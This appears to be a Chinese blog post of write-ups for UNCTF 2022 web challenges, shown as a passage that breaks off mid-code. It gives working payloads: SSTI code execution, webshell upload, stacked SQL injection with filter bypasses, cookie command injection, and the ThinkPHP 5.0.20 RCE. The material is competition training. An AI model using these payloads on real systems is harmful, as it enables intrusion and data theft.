class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> border: 1px solid <span class="hljs-comment">#232323;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&#125;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/style&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;table border=&amp;<span class="hljs-comment">#39;1&amp;#39; cellpadding=&amp;#39;10&amp;#39;&amp;gt;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;tr&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;td&amp;gt;&amp;lt;p <span class="hljs-built_in">id</span>=&amp;<span class="hljs-comment">#34;tishi&amp;#34;&amp;gt;就TM你不点是吧&amp;lt;/p&amp;gt;&amp;lt;/h3&amp;gt;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/tr&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/table&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;script&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">document.getElementById(<span class="hljs-params">&amp;<span class="hljs-comment">#34;text-button&amp;#34;).onclick = function() &#123;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">document.getElementById(<span class="hljs-params">&amp;<span class="hljs-comment">#34;tishi&amp;#34;).innerHTML = &amp;#34;好好好，我是willing，谢谢你陌生人，为了感谢你，我告诉你flag就在flag.txt&amp;#34;;</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&#125;;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/script&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/center&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/body&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/html&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;<span class="hljs-comment">#39;&amp;#39;&amp;#39; % name</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">return</span> render_template_string(<span class="hljs-params">template</span>)</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">if</span> __name__ == &amp;<span class="hljs-comment">#34;__main__&amp;#34;:</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">app.debug = <span class="hljs-literal">True</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">app.run(<span class="hljs-params">port=<span class="hljs-number">5000</span></span>)</span></span></span></span></span></span></span></span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">user=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x.__init__.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml">&amp;pwd=123456</span><br></code></pre></td></tr></table></figure><p>flag藏在env里</p><h2 id="302与深大-深圳大学"><a href="#302与深大-深圳大学" class="headerlink" title="302与深大-深圳大学"></a>302与深大-深圳大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744865.png" alt="image-20221119102443817"></p><p>bp抓包打</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744866.png" alt="image-20221113143048489"></p><p>flag在env里</p><h2 id="easy-upload-云南警官学院"><a href="#easy-upload-云南警官学院" class="headerlink" title="easy_upload-云南警官学院"></a>easy_upload-云南警官学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744867.png" alt="image-20221118210549016"></p><p>上传shell.php，改mime为image&#x2F;png</p><p>接着执行命令</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span>*<br></code></pre></td></tr></table></figure><p>找到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>ctf/flag<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744868.png" alt="image-20221113144742428"></p><p>cat flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744869.png" alt="image-20221113144811877"></p><h2 id="我太喜欢bilibili大学啦–中北大学"><a href="#我太喜欢bilibili大学啦–中北大学" class="headerlink" title="我太喜欢bilibili大学啦–中北大学"></a>我太喜欢bilibili大学啦–中北大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744870.png" alt="image-20221118203614363"></p><p>打开就是phpinfo()送flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744871.png" alt="image-20221113145205884"></p><h2 id="世界和平-西南科技大学"><a href="#世界和平-西南科技大学" class="headerlink" title="世界和平-西南科技大学"></a>世界和平-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744872.png" alt="image-20221119102505365"></p><p>堆叠注入</p><p>被过滤的明文会回显信息</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">其实台下的观众就我一个，其实我也看出你有点不舍。是否还值得...<br></code></pre></td></tr></table></figure><p>，用大写绕过会被替换为空，所以大写+双写绕过</p><p>payload:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">0</span>;SESETT <span class="hljs-keyword">@a</span>=<span class="hljs-number">0</span>x73656c656374202a2066726f6d20466c6167;PREPPREPAREARE ark FRFROMOM <span class="hljs-keyword">@a</span>;execute ark;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744873.png" alt="image-20221114112151287"></p><p>或者</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">query</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;show columns FRFROMOM FlFlagag;</span><br><span class="hljs-attribute">query</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;SELSELECTECT FlFlagag FRFROMOM FlFlagag;</span><br></code></pre></td></tr></table></figure><h2 id="Sqlsql-中国人民公安大学"><a href="#Sqlsql-中国人民公安大学" class="headerlink" title="Sqlsql-中国人民公安大学"></a>Sqlsql-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744874.png" alt="image-20221119102519457"></p><p>也是堆叠注入</p><p>给了源码附件，审计发现，所有地方都对username和studentid两个字段的输入进行了过滤</p><p>使用函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addslashes_deep</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>) ? <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;addslashes_deep&#x27;</span>, <span class="hljs-variable">$value</span>): <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>addslashes进行转义，并且</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>);<br></code></pre></td></tr></table></figure><p>排除宽字节（我觉得应该没了），最后在index.php发现存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from score where username=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">addslashes_deep</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;用户已完成考试\&quot;);&lt;/script&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">addslashes_deep</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&quot;&#x27;, <span class="hljs-subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q1&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q2&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q3&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q4&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q5&#x27;</span>].<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">multi_query</span>(<span class="hljs-variable">$query</span>)===<span class="hljs-literal">TRUE</span>) &#123;<br>            <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;已完成考试！\&quot;);&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script language=&#x27;JavaScript&#x27;&gt;location.replace(&#x27;index.php&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;something error!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对q1q2等参数无过滤，直接拼接，很明显的漏洞。</p><p>先创建一个用户，登录，答题，抓修改提交答案的包</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">q1</span>=1&amp;q2=2&amp;q3=3&amp;q4=2&amp;q5=&#x27;);insert into<span class="hljs-built_in"> users </span>values (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;88&#x27;</span>, <span class="hljs-string">&#x27;309&#x27;</span>);<br><span class="hljs-attribute">q1</span>=1&amp;q2=2&amp;q3=3&amp;q4=2&amp;q5=&#x27;);UPDATE<span class="hljs-built_in"> users </span><span class="hljs-built_in">SET</span> <span class="hljs-attribute">studentid</span>=<span class="hljs-string">&#x27;011&#x27;</span> WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;8&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>测试一下，发现可行。</p><p>试图update修改修改admin密码，结果压根没有admin用户。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">q1=1&amp;q2=2&amp;q3=3&amp;q4=2&amp;q5=&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span> (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>);<br></code></pre></td></tr></table></figure><p>成功登录</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744875.png" alt="image-20221114141301709"></p><p>随便查找一个用户成绩</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744876.png" alt="image-20221114141328020"></p><p>得到flag。</p><h2 id="我太喜欢bilibili大学啦修复版-中北大学"><a href="#我太喜欢bilibili大学啦修复版-中北大学" class="headerlink" title="我太喜欢bilibili大学啦修复版-中北大学"></a>我太喜欢bilibili大学啦修复版-中北大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744877.png" alt="image-20221118212934890"></p><p>phpinfo得到hint1：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">YWRtaW5fdW5jdGYucGhw</span> <br><br>admin_unctf.php<br></code></pre></td></tr></table></figure><p>抓admin_unctf.php包，得到hint2</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">dW5jdGYyMDIyL3VuY3RmMjAyMg</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>unctf2022/unctf2022<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744878.png" alt="image-20221115131424473"></p><p>可知是一个登录密码，登录得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;FLAG=nonono&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;username or password is empty&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;unctf2022&quot;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-string">&quot;unctf2022&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>        @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping &quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;username or password error&quot;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">post:</span><br>username<span class="hljs-operator">=</span>unctf<span class="hljs-number">2022</span>&amp;password<span class="hljs-operator">=</span>unctf<span class="hljs-number">2022</span>&amp;+<span class="hljs-operator">=</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%95</span><br><span class="hljs-symbol">cookie:</span><br>cmd<span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>||cat /flag<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744879.png" alt="image-20221115131553157"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">aHR<span class="hljs-number">0</span>cH<span class="hljs-name">M6</span>Ly<span class="hljs-number">9</span>zcGFjZS<span class="hljs-number">5</span>iaWxpYmlsaS<span class="hljs-number">5</span>jb<span class="hljs-number">20</span>v<span class="hljs-symbol">NjczOTA3</span>MzU<span class="hljs-number">2</span><br><br>https:<span class="hljs-comment">//space.bilibili.com/673907356</span><br></code></pre></td></tr></table></figure><p>访问得到：</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744880.png" alt="image-20221115131628901"></p><h2 id="给你一刀-西南科技大学"><a href="#给你一刀-西南科技大学" class="headerlink" title="给你一刀-西南科技大学"></a>给你一刀-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744881.png" alt="image-20221118212953156"></p><p>thinkphp5.0.20漏洞</p><p><a href="https://blog.csdn.net/qq_53099802/article/details/124472792">参考</a></p><p>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=ls<br></code></pre></td></tr></table></figure><p>flag在env里</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744882.png" alt="image-20221116113401091"></p><h2 id="ez2048-中南大学"><a href="#ez2048-中南大学" class="headerlink" title="ez2048-中南大学"></a>ez2048-中南大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744883.png" alt="image-20221119102541905"></p><p>没玩过逆向，比较菜</p><p>通过跟进找到了checkinvited函数（startcheck–&gt;checkinvited</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> args = [...<span class="hljs-variable language_">arguments</span>];<br><span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">24</span>);<br><span class="hljs-keyword">const</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">0</span>, <span class="hljs-number">68</span>);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>);<br>view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">3</span>, <span class="hljs-number">80</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">4</span>, <span class="hljs-number">0x0e5d</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">6</span>, <span class="hljs-number">0x323a</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0x1a2a</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0x0512160d</span>, <span class="hljs-literal">true</span>);<br>view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-number">0x02560002</span>);<br>view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">20</span>, <span class="hljs-number">0x130000</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">code</span>) &#123;<br>  <span class="hljs-keyword">if</span> (code.<span class="hljs-property">length</span> !== <span class="hljs-number">24</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">let</span> encode = [];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; code.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (~i % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) &#123;<br>      encode.<span class="hljs-title function_">push</span>(code.<span class="hljs-title function_">charCodeAt</span>(i) ^ code.<span class="hljs-title function_">charCodeAt</span>(i - <span class="hljs-number">2</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      encode.<span class="hljs-title function_">push</span>(code.<span class="hljs-title function_">charCodeAt</span>(i) ^ code.<span class="hljs-title function_">charCodeAt</span>(i + <span class="hljs-number">1</span>));<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; code.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (view.<span class="hljs-title function_">getInt8</span>(i) !== encode[i]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之前没接触过js，但是大概看懂还是没问题的，大概意思就是输入一个24位的code，然后经过异或操作得到一个数组，再与已有的数组比对，简单运行一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// create an ArrayBuffer with a size in bytes</span><br>    <br><span class="hljs-keyword">const</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-keyword">const</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">0</span>, <span class="hljs-number">68</span>);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>);<br>    view.<span class="hljs-title function_">setUint8</span>(<span class="hljs-number">3</span>, <span class="hljs-number">80</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">4</span>, <span class="hljs-number">0x0e5d</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">6</span>, <span class="hljs-number">0x323a</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0x1a2a</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0x0512160d</span>, <span class="hljs-literal">true</span>);<br>    view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-number">0x02560002</span>);<br>    view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">20</span>, <span class="hljs-number">0x130000</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">24</span>; i++) &#123;<br>      <span class="hljs-variable 